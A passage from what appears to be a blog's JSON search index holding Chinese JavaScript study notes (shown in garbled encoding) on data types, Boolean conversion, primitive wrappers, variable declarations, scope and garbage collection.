çš„å€¼ï¼Œå·²ç»å­˜åœ¨è¯¯å·®          ç”¨ $2^{-n}$ ç›¸åŠ å¾—åˆ°å°æ•°ï¼Œ å½“ $p=1074 - 1023 = 51$ï¼Œåªç•™ç»™å°æ•°å€¼ 1bit æ—¶ï¼Œåªèƒ½è¡¨ç¤º 0.5                    æ•´æ•°éƒ¨åˆ†ï¼š            æ•°å­— Â±0ï¼šé™¤ç¬¦å·ä½ï¼Œå…¶ä»–bit = 0 ï¼ŒåŒ…æ‹¬éšè—ä½ï¼Œæ‰€ä»¥æ˜¯éè§„èŒƒæ•°  "
  },
  
  {
    "title": "2.2.åŸºæœ¬æ•°æ®ç±»å‹ï¼ˆBooleanï¼‰",
    "url": "/posts/2.2.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B-Boolean/",
    "categories": "JavaScript, åŸºæœ¬ç±»å‹",
    "tags": "javascriptBase",
    "date": "2022-08-03 00:00:00 +0800",
    





    
    "snippet": "Boolean            Boolean()      true      false                  string      éç©ºä¸² â€œ â€      â€œâ€ ç©ºä¸²              number      éé›¶å€¼ï¼ˆåŒ…æ‹¬æ— ç©·ï¼‰      0 ã€ NaN              Object      å¯¹è±¡      null              ...",
    "content": "Boolean            Boolean()      true      false                  string      éç©ºä¸² â€œ â€      â€œâ€ ç©ºä¸²              number      éé›¶å€¼ï¼ˆåŒ…æ‹¬æ— ç©·ï¼‰      0 ã€ NaN              Object      å¯¹è±¡      null              undefined      -      undefined              æ•°å€¼ Array      æ•°ç»„ï¼ˆç©ºæ•°ç»„ï¼‰      ![]  å…ˆè½¬ä¸ºç©ºä¸²ï¼Œå†å–å        éšå¼è½¬æ¢ï¼šä¸¤æ­¥å–åï¼šè½¬æ¢+å–å+å–åBooleanå¯¹è±¡ &amp; Booleanå€¼â€‹\ttypeof æ“ä½œç¬¦å¯¹ Booleanå€¼ï¼ˆåŸå§‹å€¼ï¼‰è¿”å› â€˜booleanâ€™ï¼Œå¯¹Booleanå¯¹è±¡è¿”å› â€˜objectâ€™â€‹\tBooleanå¯¹è±¡æ˜¯Booleanç±»å‹çš„å®ä¾‹ï¼Œè€ŒBooleanå€¼ï¼ˆåŸå§‹å€¼ï¼‰ä¸æ˜¯typeof booleanObject;\t// objecttypeof booleanValue;\t// booleanbooleanObject instanceof Boolean; // truebooleanValue instanceof Boolean; // falseâ€‹\tåœ¨åˆ¤æ–­ä¸­è½¬æ¢çš„å€¼ä¸åŒï¼šbooleanObject &amp;&amp; false // true, object = truelet booleanValue = falsebooleanValue &amp;&amp; true // falseğŸŒ  å¼ºçƒˆä¸å»ºè®®ä½¿ç”¨ Booleanå¯¹è±¡"
  },
  
  {
    "title": "2. æ•°æ®ç±»å‹",
    "url": "/posts/2.%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/",
    "categories": "JavaScript",
    "tags": "javascriptBase",
    "date": "2022-08-01 00:00:00 +0800",
    





    
    "snippet": "  åŸºæœ¬æ•°æ®ç±»å‹ï¼š          undefined &amp; null      number      boolean      string        åŸºæœ¬å¼•ç”¨ç±»å‹ï¼š          åŸå§‹å€¼åŒ…è£…ç±»å‹      RegExp      Date      å•ä¾‹å†…ç½®å¯¹è±¡        é›†åˆå¼•ç”¨ç±»å‹ï¼š          Array &amp; TypeArray      Map...",
    "content": "  åŸºæœ¬æ•°æ®ç±»å‹ï¼š          undefined &amp; null      number      boolean      string        åŸºæœ¬å¼•ç”¨ç±»å‹ï¼š          åŸå§‹å€¼åŒ…è£…ç±»å‹      RegExp      Date      å•ä¾‹å†…ç½®å¯¹è±¡        é›†åˆå¼•ç”¨ç±»å‹ï¼š          Array &amp; TypeArray      Map   &amp; weakMap      Set   &amp; weakSet      åŸºæœ¬å’Œå¼•ç”¨ç±»å‹åŒºåˆ«            Â       åŸºæœ¬æ•°æ®ç±»å‹      å¼•ç”¨æ•°æ®ç±»å‹                  å£°æ˜çš„å­˜å‚¨åˆ†é…      æ ˆ      å †              ä¸åŒçš„è®¿é—®æœºåˆ¶      å¯ä»¥ç›´æ¥è®¿é—®åˆ°      åªèƒ½æ“ä½œå¯¹è±¡åœ¨æ ˆä¸­çš„å¼•ç”¨              å¤åˆ¶å˜é‡æ—¶      å€¼å­˜æ”¾åˆ°æ–°å˜é‡å†…å­˜ä¸­      å¼•ç”¨å­˜æ”¾åˆ°æ–°å˜é‡æ ˆä¸­ï¼Œæ“ä½œåŒä¸€ä¸ªåœ°å€              åˆ†é…æœºåˆ¶      è‡ªåŠ¨åˆ†é…ï¼Œå¤§å°å›ºå®š      åŠ¨æ€åˆ†é…ï¼Œå¯æŒ‡å‘åŒä¸€å—å¼•ç”¨              å›æ”¶æœºåˆ¶      å›æ”¶åŠæ—¶ï¼Œç”Ÿå­˜æ—¶é—´å›ºå®š      æ ¹æ®å¼•ç”¨æ¬¡æ•°äº¤ç»™å›æ”¶å™¨å›æ”¶      å›æ”¶æœºåˆ¶â€‹\tJavaScriptçš„æ‰§è¡Œç¯å¢ƒåœ¨ä»£ç æ‰§è¡ŒæœŸé—´ç®¡ç†å†…å­˜ï¼šç¡®å®šå“ªä¸ªå˜é‡ä¸å†ä½¿ç”¨ï¼Œå›æ”¶å®ƒå¹¶é‡Šæ”¾å†…å­˜ã€‚å‘¨æœŸæ€§æ‰§è¡Œã€‚â€‹\tæœ€ä¸»è¦çš„æ ‡è®°ç­–ç•¥ï¼šæ ‡è®°æ¸…ç†å’Œå¼•ç”¨è®¡æ•°å€¼ç±»å‹çš„åˆ¤æ–­  typeofï¼š ä¸€å…ƒè¿ç®—ï¼Œè¿”å›String â€” åˆ¤æ–­å¼•ç”¨ç±»å‹æ—¶ï¼Œåªä¼šè¿”å›object  instanceofï¼š åˆ¤æ–­æ˜¯å¦åœ¨åŸå‹é“¾ä¸Šprototypeobject instanceof contructor     -- åˆ¤æ–­objectçš„åŸå‹é“¾ä¸Šæ˜¯å¦å­˜åœ¨constructor.prototype\t-- object ä¸€å®šè¦æ˜¯ä¸€ä¸ªå¯¹è±¡    -- contructor ä¸€å®šè¦æ˜¯ä¸€ä¸ªå‡½æ•°      å€¼å®šä¹‰ï¼š          å¼•ç”¨ç±»å‹        let number = new Number(99);number.valueOf()+1              å€¼ç±»å‹        ler number = 99;number+1;        å¯¹äºå€¼ç±»å‹ä½¿ç”¨.æ–¹æ³•æ—¶ï¼Œä¼šåœ¨åŸå‹é“¾ä¸­è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•ï¼ˆè½¬æ¢ä¸ºå¯¹è±¡ï¼‰    ä¸¤è€…ä¼šç»“åˆå°è£…æˆä¸€ä¸ªå·¥å…·ç±»function getDataType(obj) {  if (obj === null) {    return 'null';  } else if (typeof obj === 'object') {    if (obj instanceof Array) {      return 'array';    } else {      return 'object';    }  } else {    return typeof obj;  }}undefined &amp; null  undefined ï¼šå£°æ˜ä½†æœªèµ‹å€¼  nullï¼šæ‰§è¡Œç©ºå¯¹è±¡æŒ‡é’ˆğŸŒ undefined æ´¾ç”Ÿè‡ª nullï¼Œundefined == nullâ— åŸå§‹å€¼åŒ…è£…ç±»å‹â€‹\tæ¯å½“ç”¨åˆ°æŸä¸ªåŸå§‹å€¼çš„æ–¹æ³•æˆ–å±æ€§æ˜¯ï¼Œåå°ä¼šåˆ›å»ºä¸€ä¸ªç›¸åº”åŸå§‹åŒ…è£…ç±»å‹çš„å¯¹è±¡ï¼Œä½¿å¾—åŸå§‹å€¼å…·æœ‰æ“ä½œå±æ€§çš„å„ç§æ–¹æ³•ã€‚â€‹\tECMAscriptæä¾›äº†ä¸‰ç§ç‰¹æ®Šçš„å¼•ç”¨ç±»å‹ï¼šBoolean ã€Numberã€Stringlet str1 = new String('text string') // åŸå§‹å€¼ str1let str2 = str1.length;  // è®¿é—®åˆ° str1 ä¸­çš„å±æ€§ â€”â€” åªè¯»çš„æ¨¡å¼str2 ä»¥åªè¯»çš„æ¨¡å¼è®¿é—® str1 åœ¨å†…å­˜ä¸­ä¿å­˜çš„å€¼ï¼Œåå°ä¼šæ‰§è¡Œä»¥ä¸‹ä¸‰ä¸ªæ“ä½œï¼šâ€‹\t :one: åˆ›å»ºStringå®ä¾‹ :two:è°ƒç”¨å®ä¾‹ä¸Šçš„ç‰¹ç‚¹æ–¹æ³•  :three:é”€æ¯å®ä¾‹ä½œç”¨åŸŸâ€‹\tå¼•ç”¨ç±»å‹å’ŒåŸå§‹å€¼åŒ…è£…ç±»å‹ä¸»è¦åŒºåˆ«åœ¨äºå¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸï¼šâ€‹\tè‡ªåŠ¨åˆ›å»ºçš„åŸå§‹å€¼åŒ…è£…ç±»å‹å¯¹è±¡ï¼Œåªå­˜åœ¨äºè®¿é—®å®ƒçš„é‚£è¡Œä»£ç æ‰§è¡ŒæœŸå†…ã€‚å³ä¸èƒ½åœ¨è¿è¡Œæ—¶ç»™å®ƒæ·»åŠ å±æ€§å’Œæ–¹æ³•ã€‚let str1 = new String('text string') // åŸå§‹å€¼ str1str1.color('red');console.log(str1.color); // undefinedç¬¬äºŒè¡Œä»£ç å°è¯•ç»™ åŸå§‹å€¼æ–°å¢å±æ€§str1.colorï¼Œä½†ç¬¬ä¸‰è¡Œè®¿é—®ä¸åˆ°ï¼š  ç¬¬äºŒè¡Œä»£ç è®¿é—®åˆ°çš„Stringå¯¹è±¡æ˜¯ä¸´æ—¶çš„ï¼Œå·²ç»è¢«é”€æ¯  ç¬¬ä¸‰è¡Œä»£ç ä¸­åˆ›å»ºäº†æ–°çš„è‡ªå·±Stringå¯¹è±¡ï¼Œä½†è¿™ä¸ªå¯¹è±¡æ²¡æœ‰è¿™ä¸ªå±æ€§ç±»å‹è½¬æ¢â€‹\tå¯ä»¥ä½¿ç”¨Boolean ã€Numberã€Stringæ„é€ å‡½æ•°æ˜¾å¼åŸå§‹å€¼åŒ…è£…ç±»å‹ï¼Œä½†ä¸å»ºè®®let str = '30'typeof str; //'string'// è½¬å‹å‡½æ•°let num = Number(str) typeof num; // 'number'// æ„é€ å‡½æ•°let obj = new Number(str)typeof obj; // 'object'â— å•ä¾‹å†…ç½®å¯¹è±¡â€‹\tECMA-262ä¸­ï¼Œå¯¹å†…ç½®å¯¹è±¡çš„å®šä¹‰ï¼šä»»ä½•ç”±ECMAScriptå®ç°æä¾›ã€ä¸å®¿ä¸»ç¯å¢ƒæ— å…³ï¼Œå¹¶åœ¨ç¨‹åºå¼€å§‹æ‰§è¡Œæ˜¯å°±å­˜åœ¨çš„å¯¹è±¡ã€‚â€‹\t\tå¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œè€Œæ— éœ€åˆ›å»ºå®ä¾‹ â€”â€”æ— æ³•åœ¨æ˜¾æ€§åœ°å®ä¾‹åŒ–å†…ç½®å¯¹è±¡ï¼ˆåœ¨è¿è¡Œæ—¶å°±å­˜åœ¨å¯¹è±¡ï¼‰ï¼ŒåŒ…æ‹¬Objectã€Arrayã€Stringã€Globalã€Mathå…œåº•å¯¹è±¡ Globalâ€‹\tECMA-262è§„å®šï¼ŒGlobalå¯¹è±¡ä¸ºå…œåº•å¯¹è±¡ï¼Œæ‰€é’ˆå¯¹çš„æ˜¯ä¸å±äºä»»ä½•å¯¹è±¡çš„å±æ€§å’Œæ–¹æ³•ã€‚åœ¨å…¨å±€ä½œç”¨åŸŸä¸­å®šä¹‰çš„å˜é‡å’Œå‡½æ•°ï¼Œéƒ½æ˜¯Globalçš„å±æ€§ã€‚â€‹\tåŒ…æ‹¬ isNan() ã€isFinite() ã€parseFloat() ç­‰â€‹\tåœ¨ æµè§ˆå™¨ä¸­ï¼Œwindowå¯¹è±¡å®ç°ä¸ºGlobalå¯¹è±¡çš„ä»£ç†ã€‚æ‰€æœ‰å…¨å±€ä½œç”¨åŸŸä¸­å£°æ˜çš„å˜é‡å’Œå‡½æ•°éƒ½å˜æˆäº†windowå±æ€§ã€‚URL ç¼–ç æ–¹æ³•            encodeURL()      encodeURLComponent()                  å¯¹æ•´ä¸ªURLç¼–ç       ç¼–ç URLä¸­å•ç‹¬çš„ç»„ä»¶              ä¸ç¼–ç å±äºURLç»„ä»¶çš„ç‰¹æ®Šå­—ç¬¦      ç¼–ç æ‰€æœ‰éæ ‡å‡†å­—ç¬¦      â€‹\tdecodeURL() &amp; decodeURLComponent()  åŒä¸Ševal æ–¹æ³•â€‹\tå®Œæ•´çš„ECMScriptè§£é‡Šå™¨ï¼Œæ¥å—ä¸€ä¸ªå­—ç¬¦ä¸²ï¼ˆè¦æ‰§è¡Œçš„ECMAScriptè¯­å¥ï¼‰ã€‚è¿è¡Œæ—¶ï¼Œæ‰å°†å‚æ•°è§£é‡Šä¸ºECMAScriptè¯­å¥ï¼Œå¹¶æ’å…¥åˆ°è¯¥ä½ç½®ï¼Œè°ƒç”¨ä»£ç æ‰€åœ¨çš„ä¸Šä¸‹æ–‡ â€”â€” è¢«æ‰§è¡Œçš„ä»£ç ä¸è¯¥ä¸Šä¸‹æ–‡æ‹¥æœ‰åŒæ ·çš„ä½œç”¨åŸŸé“¾ã€‚â€‹\tä½†å®šä¹‰çš„ä»»ä½•å˜é‡å’Œå‡½æ•°éƒ½ä¸ä¼šè¢«æå‡ï¼šè§£æä»£ç æ—¶å€™ï¼ŒECMAScriptè¯­å¥ä»…ä»…ä½œä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œåªæœ‰åœ¨æ‰§è¡Œæ˜¯æ‰ä¼šè¢«åˆ›å»ºã€‚â€‹\tåœ¨ä¸¥æ ¼æ¨¡å¼ä¸‹ï¼Œeval() å†…éƒ¨åˆ›å»ºçš„å˜é‡å’Œå‡½æ•°æ— æ³•è¢«å¤–éƒ¨è®¿é—®ã€‚å¿…é¡»éå¸¸æ…é‡ä½¿ç”¨ã€‚åœ¨è§£é‡Šç”¨æˆ·è¾“å…¥ç­‰ä¸å¯æ§å­—ç¬¦ä¸²æ—¶ï¼Œå¯èƒ½è¢«æ¤å…¥æ‰§è¡Œè¯­å¥Global å¯¹è±¡å±æ€§  æ‰€æœ‰åŸç”Ÿå¼•ç”¨ç±»å‹æ„é€ å‡½æ•°ï¼›  ç‰¹æ®Šå€¼ï¼šNaN Undefined infinityï¼›  Erroræ„é€ å‡½æ•°ï¼›"
  },
  
  {
    "title": "1. å˜é‡",
    "url": "/posts/1.%E5%8F%98%E9%87%8F/",
    "categories": "JavaScript",
    "tags": "javascriptBase",
    "date": "2022-08-01 00:00:00 +0800",
    





    
    "snippet": "æ•°æ®ç±»å‹åŸºæœ¬å’Œå¼•ç”¨ç±»å‹åŒºåˆ«            Â       åŸºæœ¬æ•°æ®ç±»å‹      å¼•ç”¨æ•°æ®ç±»å‹                  å£°æ˜çš„å­˜å‚¨åˆ†é…      æ ˆ      å †              ä¸åŒçš„è®¿é—®æœºåˆ¶      å¯ä»¥ç›´æ¥è®¿é—®åˆ°      åªèƒ½æ“ä½œå¯¹è±¡åœ¨æ ˆä¸­çš„å¼•ç”¨              å¤åˆ¶å˜é‡æ—¶      å€¼å­˜æ”¾åˆ°æ–°å˜é‡å†…å­˜ä¸­ï¼Œä¸¤ä¸ªå˜é‡äº’ä¸å¹²æ‰°      å¼•ç”¨å­˜æ”¾åˆ°æ–°...",
    "content": "æ•°æ®ç±»å‹åŸºæœ¬å’Œå¼•ç”¨ç±»å‹åŒºåˆ«            Â       åŸºæœ¬æ•°æ®ç±»å‹      å¼•ç”¨æ•°æ®ç±»å‹                  å£°æ˜çš„å­˜å‚¨åˆ†é…      æ ˆ      å †              ä¸åŒçš„è®¿é—®æœºåˆ¶      å¯ä»¥ç›´æ¥è®¿é—®åˆ°      åªèƒ½æ“ä½œå¯¹è±¡åœ¨æ ˆä¸­çš„å¼•ç”¨              å¤åˆ¶å˜é‡æ—¶      å€¼å­˜æ”¾åˆ°æ–°å˜é‡å†…å­˜ä¸­ï¼Œä¸¤ä¸ªå˜é‡äº’ä¸å¹²æ‰°      å¼•ç”¨å­˜æ”¾åˆ°æ–°å˜é‡æ ˆä¸­ï¼Œæ“ä½œåŒä¸€ä¸ªåœ°å€              åˆ†é…æœºåˆ¶      è‡ªåŠ¨åˆ†é…ï¼Œå¤§å°å›ºå®š      åŠ¨æ€åˆ†é…ï¼Œå¯æŒ‡å‘åŒä¸€å—å¼•ç”¨              å›æ”¶æœºåˆ¶      å›æ”¶åŠæ—¶ï¼Œç”Ÿå­˜æ—¶é—´å›ºå®š      æ ¹æ®å¼•ç”¨æ¬¡æ•°äº¤ç»™å›æ”¶å™¨å›æ”¶            å˜é‡å£°æ˜æ–¹å¼ï¼Œä¼šå½±å“å…¶æ•°æ®ç±»å‹    ä½¿ç”¨newå…³é”®å­—ä¼šåˆ›å»ºä¸€ä¸ªObjectç±»å‹å¯¹è±¡ï¼Œå…¶è¡Œä¸ºç±»ä¼¼åŸå§‹å€¼  let name = 'username' // typeof = stringname.age = 18console.log(name.age) // undefinedlet name = new String('username') // typeof = objectname.age = 20console.log(name.age) // 20       ä¼ é€’å‚æ•°æ—¶ï¼ŒæŒ‰å€¼ä¼ é€’ï¼ˆä¸å¤åˆ¶å˜é‡ä¸€æ ·ï¼Œå¼•ç”¨ç±»å‹ä»…ä¼ é€’åœ°å€ï¼‰    ä½†åœ¨å‡½æ•°å†…éƒ¨é‡å†™å¯¹è±¡objæ—¶ï¼Œå˜æˆä¸€ä¸ªæŒ‡å‘æœ¬åœ°å¯¹è±¡çš„æŒ‡é’ˆï¼Œä¸å¤–éƒ¨å¯¹è±¡æ–­è”ã€‚ä¸”è¿™ä¸ªæŒ‡é’ˆåœ¨å‡½æ•°ç»“æŸè°ƒç”¨æ—¶ï¼Œé”€æ¯æ‰äº†ï¼Œå¯¹å¤–éƒ¨å¯¹è±¡æ²¡æœ‰å½±å“ã€‚  function setName(obj){    obj.name = 'nicholas'    obj = new Object()    obj.name = 'greg'}let person = new Object()setName(person) // person.name = 'nicholas'å˜é‡å£°æ˜ï¼ˆes6 ç‰¹æ€§ï¼‰ä½œç”¨åŸŸåˆç§°ä¸ºâ€œæ‰§è¡Œä¸Šä¸‹æ–‡â€ï¼Œæ¯ä¸ªä¸Šä¸‹æ–‡éƒ½æœ‰ä¸€ä¸ªå…³è”çš„å˜é‡å¯¹è±¡ï¼ˆvarialbe objectï¼‰ï¼Œå®šä¹‰çš„æ‰€æœ‰å˜é‡å’Œå‡½æ•°éƒ½å­˜åœ¨ä¸æ­¤ï¼Œåœ¨åå°å¤„ç†æ•°æ®æ—¶å¯ä»¥è¯»å–åˆ°ã€‚ä¸Šä¸‹æ–‡åœ¨å…¶æ‰€æœ‰ä»£ç éƒ½æ‰§è¡Œå®Œæ¯•åä¼šé”€æ¯ï¼ŒåŒ…æ‹¬å®šä¹‰çš„å˜é‡å’Œå‡½æ•°ã€‚å…¨å±€ä¸Šä¸‹æ–‡æ˜¯æœ€å¤–å±‚çš„ä¸Šä¸‹æ–‡ï¼Œæ ¹æ®ECMAscriptå®ç°çš„å®¿ä¸»ç¯å¢ƒä¸åŒï¼Œè¡¨ç¤ºå…¨å±€ä¸Šä¸‹æ–‡çš„å¯¹è±¡å¯èƒ½ä¸ä¸€æ ·ã€‚åœ¨æµè§ˆå™¨ä¸­ï¼Œå…¨å±€ä¸Šä¸‹æ–‡æŒ‡â€œwindowå¯¹è±¡â€ã€‚åªæœ‰åœ¨é€€å‡ºæµè§ˆå™¨æˆ–å…³é—­é¡µé¢æ—¶ï¼Œwindowå¯¹è±¡ä¼šé”€æ¯ã€‚ECMAscriptç¨‹åºæ‰§è¡Œæµé€šè¿‡ä¸Šä¸‹æ–‡å †æ ˆè¿›è¡Œæ§åˆ¶ã€‚ä¸Šä¸‹æ–‡æ‰§è¡Œä»£ç æ—¶ï¼Œåˆ›å»ºå˜é‡å¯¹è±¡çš„ä¸€ä¸ªä½œç”¨åŸŸé“¾(scopt chain)ï¼Œå†³å®šå„çº§ä¸Šä¸‹æ–‡ä»£ç è®¿é—®å˜é‡ã€å‡½æ•°çš„é¡ºåºã€‚æ­£åœ¨æ‰§è¡Œçš„ä¸Šä¸‹æ–‡ä½äºå †æ ˆæœ€ä¸Šé¢ï¼Œå…¶ä»£ç å§‹ç»ˆä½äºé“¾æ¡æœ€å‰ç«¯ï¼›å…¨å±€ä¸Šä¸‹æ–‡å˜é‡å§‹ç»ˆä½äºé“¾æ¡æœ€åé¢ã€‚æ‰§è¡Œæ ‡è¯†ç¬¦çŸ­è·¯æŸ¥æ‰¾å˜é‡å®šä¹‰ã€‚ä¸Šä¸‹æ–‡æ˜¯å‡½æ•°ï¼Œå…¶æ´»åŠ¨å¯¹è±¡ï¼ˆactivation objectï¼‰ä½œä¸ºå˜é‡å¯¹è±¡ï¼Œæœ€åˆåªæœ‰ä¸€ä¸ªå®šä¹‰å˜é‡argumentï¼›å…¨å±€å˜é‡ä¸åŒ…å«ã€‚å—ä½œç”¨åŸŸ      æœªå®šä¹‰å£°æ˜å˜é‡ç±»å‹ï¼ŒåŒæ ·å¯ä»¥ä½¿ç”¨åˆ°è¯¥å˜é‡ â€“ æ±¡æŸ“å…¨å±€ï¼šå¯èƒ½ä¿®æ”¹åˆ°å¼•ç”¨çš„æ–‡ä»¶å†…çš„å˜é‡        ä½¿ç”¨ä¸¥æ ¼æ¨¡å¼\"use strict\"è¦æ±‚å¿…é¡»å£°æ˜        foræ²¡æœ‰å—ä½œç”¨åŸŸï¼Œä¸´æ—¶å˜é‡iå®šä¹‰ä½¿ç”¨varä¸å…¨å±€å˜é‡åŒåæ—¶ï¼Œå°†ä¿®æ”¹å…¨å±€å˜é‡ï¼›æ¨èä½¿ç”¨letå£°æ˜ï¼Œäº§ç”Ÿå—çº§ä½œç”¨åŸŸ        ç«‹å³æ‰§è¡Œå‡½æ•°ï¼š é¿å…å¯¹å…¨å±€å˜é‡çš„æ±¡æŸ“ï¼Œå¼ºåˆ¶åœ¨å‡½æ•°å†…éƒ¨ä½¿ç”¨    èŠ±æ‹¬å·{}å†…ä½¿ç”¨letäº§ç”Ÿå—çº§ä½œç”¨åŸŸÂ· const åœ¨åŒä¸€ä½œç”¨åŸŸå†…ä¸å¯æ”¹ï¼Œå‡½æ•°å†…çš„å±€éƒ¨ä½œç”¨åŸŸå¯å†æ¬¡å£°æ˜var  å­˜åœ¨å˜é‡å£°æ˜æå‡çš„ç¼ºé™·ï¼š æœªå£°æ˜å¯ä½¿ç”¨ï¼Œå°±æ˜¯æ²¡æœ‰å®šä¹‰ï¼›js æ‰€æœ‰å£°æ˜æåˆ°å‡½æ•°ä½“é¡¶éƒ¨ï¼Œèµ‹å€¼æ“ä½œç•™åœ¨åŸæ¥çš„ä½ç½®  å˜é‡è¦†ç›–ï¼šå¤šæ¬¡å£°æ˜å®šä¹‰æ— æŠ¥é”™ï¼Œä½¿ç”¨æœ€è¿‘å®šä¹‰çš„å˜é‡  æ²¡æœ‰å—çº§ä½œç”¨åŸŸï¼›æ˜¯å‡½æ•°çº§ä½œç”¨åŸŸÂ· var å£°æ˜çš„å˜é‡ä¼šä¿å­˜åˆ° Window ä¸­ï¼Œè‹¥ä¸ Window å†…å·²æœ‰å…¨å±€å¯¹è±¡åŒåï¼Œä¼šä¿®æ”¹åˆ° DOM çš„å€¼const let  ï¼å—çº§ä½œç”¨åŸŸï¼Œä¸å­˜åœ¨å˜é‡æå‡  let å®šä¹‰å˜é‡ï¼›  const å®šä¹‰å¸¸é‡ï¼Œå£°æ˜æ—¶å¿…é¡»èµ‹å€¼ï¼Œå€¼å’Œå¼•ç”¨åœ°å€ä¸å¯æ›´æ”¹ï¼Œå¼•ç”¨çš„å€¼å¯ä»¥æ”¹é¿å…å˜é‡ä½“ç°çš„ç¼ºé™·ï¼Œå½¢æˆTDC æš‚æ—¶æ€§æ­»åŒºï¼š ä½¿ç”¨å‰å¿…é¡»å…ˆå£°æ˜      å˜é‡åå¯¹å†…å­˜åœ°å€çš„å¼•ç”¨ï¼Œå¼•ç”¨ä¸å¯æ›´æ”¹ï¼›å¯¹è±¡ç­‰åŒä¸€ä¸ªå†…å­˜ç©ºé—´ä¿®æ”¹å¯ä»¥          ä¿®æ”¹å˜é‡å€¼ä¼šé‡æ–°å¼€è¾Ÿä¸€ä¸ªå†…å­˜ç©ºé—´ï¼Œç›¸å½“äºä¿®æ”¹åœ°å€å¼•ç”¨            åŒä¸€ä½œç”¨åŸŸä¸­ ä¸å¯é‡å¤å£°æ˜  å†»ç»“å˜é‡ Object.freezaÂ· const å®šä¹‰å¯¹è±¡çš„å†…å®¹å¯ä»¥æ”¹å˜ï¼Œæ­¤æ—¶ç”¨åˆ°å†»ç»“å˜é‡const HOST = {  url: \"https://www..com/api\",  port: 442};Object.freeze(HOST);HOST.port = 80; //åœ¨ä¸¥æ ¼æ¨¡å¼ä¸‹æŠ¥é”™ï¼šé‡å¤å£°æ˜å…±åŒç‚¹      å‡½æ•°ä¸­å˜é‡å¯è®¿é—®åˆ°å¤–éƒ¨çš„å…¨å±€å˜é‡ï¼ˆæ— è®ºæ˜¯å“ªç§å˜é‡ï¼‰        åœ¨å—çº§ä½œç”¨åŸŸæ‰¾ä¸åˆ°æ—¶ï¼Œå¾€å¤–æŸ¥æ‰¾å®šä¹‰  ä½œç”¨åŸŸé“¾å»¶é•¿      try/catch è¯­å¥ä¸­çš„ catchå—ã€‚   åœ¨catchè¯­å¥ä¹‹å‰ï¼Œåˆ›å»ºæ–°å˜é‡å¯¹è±¡ï¼ŒåŒ…å«å°†è¦æŠ›å‡ºçš„é”™è¯¯å¯¹è±¡å£°æ˜ã€‚        with è¯­å¥ã€‚   å‘ä½œç”¨åŸŸé“¾å‰ç«¯æ·»åŠ æŒ‡å®šå¯¹è±¡    åœ¨IE8ä¹‹å‰ï¼Œcatchæ•æ‰åˆ°çš„é”™è¯¯æ·»åŠ åˆ°æ‰§è¡Œä¸Šä¸‹æ–‡çš„å˜é‡å¯¹è±¡ä¸Šï¼Œè€Œä¸æ˜¯catchè¯­å¥çš„å˜é‡å¯¹è±¡ä¸Šï¼Œå¯¼è‡´åœ¨catchå¤–éƒ¨ä¹Ÿå¯ä»¥æ•è·åˆ°é”™è¯¯ã€‚å›æ”¶æœºåˆ¶â€‹\tJavaScriptçš„æ‰§è¡Œç¯å¢ƒåœ¨ä»£ç æ‰§è¡ŒæœŸé—´ç®¡ç†å†…å­˜ï¼šç¡®å®šå“ªä¸ªå˜é‡ä¸å†ä½¿ç”¨ï¼Œå›æ”¶å®ƒå¹¶é‡Šæ”¾å†…å­˜ã€‚å‘¨æœŸæ€§æ‰§è¡Œã€‚â€‹\tæœ€ä¸»è¦çš„æ ‡è®°ç­–ç•¥ï¼šæ ‡è®°æ¸…ç†å’Œå¼•ç”¨è®¡æ•°  å›æ”¶å¯¹è±¡ â€”â€” å½“ä¸€ä¸ªå˜é‡æ²¡æœ‰è¢«å…¶ä»–å˜é‡æˆ–å±æ€§å¼•ç”¨çš„æ—¶å€™          å…¨å±€å˜é‡ ï¼šæŒç»­åˆ°æµè§ˆå™¨é¡µé¢å…³é—­      å±€éƒ¨å˜é‡ ï¼šå‡½æ•°æ‰§è¡Œç»“æŸå      æ•°æ®å­˜å‚¨      åŸºæœ¬æ•°æ®ç±»å‹ â€”â€” æ ˆ        å¼•ç”¨æ•°æ®ç±»å‹ â€”â€” å †ï¼Œåœ¨æ ˆä¸­å­˜å‚¨å®é™…å¯¹è±¡å¼•ç”¨    å½“å¼•ç”¨æ•°æ®ç±»å‹å¼•ç”¨ç›®æ ‡æ”¹å˜æ—¶ï¼Œæ—§çš„æ ˆå®é™…å¯¹è±¡å¤±å»å¼•ç”¨ï¼Œè¿™å˜æˆéœ€è¦å›æ”¶çš„åƒåœ¾  ä¸¤ç§å¸¸ç”¨æ–¹æ³•â€‹\tåƒåœ¾å›æ”¶å¹¶ä¸æ˜¯å®æ—¶çš„ï¼Œå› ä¸ºå¼€é”€æ¯”è¾ƒå¤§ï¼Œæ‰€ä»¥åƒåœ¾å›æ”¶å™¨ä¼šå‘¨æœŸæ€§çš„é‡Šæ”¾ç¨‹åºä¸­å·²ç»ä¸åœ¨è¢«å¼•ç”¨çš„åƒåœ¾å¯¹è±¡ã€‚æµè§ˆå™¨å¸¸ä½¿ç”¨åˆ°ä¸¤ç§æ ‡å‡†ç­–ç•¥ï¼šæ ‡è®°æ¸…ç†ã€å¼•ç”¨è®¡æ•°#### 1. æ ‡è®°æ¸…é™¤æ³•ï¼ˆå¤§éƒ¨åˆ†æµè§ˆå™¨ï¼‰ Mark-Sweepä¸¤ä¸ªé˜¶æ®µï¼š      æ ‡è®°ï¼šä»æ ¹èŠ‚ç‚¹éå†ï¼Œç»™æ¯ä¸ªå¯è®¿é—®çš„å¯¹è±¡æ‰“ä¸Šæ ‡è®°ï¼Œè¡¨ç¤ºå¯¹è±¡å¯è¾¾    ï¼ˆæ ‡è®°æ‰“æ³•å¯ä»¥æ˜¯ç»´æŠ¤ä¿©ä¸ªâ€œåœ¨ä¸åœ¨ä¸Šä¸‹æ–‡â€çš„å †æ ˆï¼›ä¹Ÿå¯ä»¥æ˜¯æ´»è·ƒæ—¶åè½¬æŸä¸€ä½ï¼Œä¸æ´»è·ƒæ—¶æ¢å¤ï¼‰        æ¸…é™¤ï¼šåœ¨æ²¡æœ‰å¯ç”¨åˆ†å—ç©ºé—´æ—¶ï¼ˆæˆ–æŸä¸ªå›ºå®šé¢‘ç‡ï¼‰ï¼Œå¯¹å †å†…å­˜éå†ï¼Œå›æ”¶æ²¡æœ‰æ ‡è®°çš„å¯¹è±¡ï¼ˆæ¸…é™¤æ— å¼•ç”¨å¯¹è±¡ï¼‰  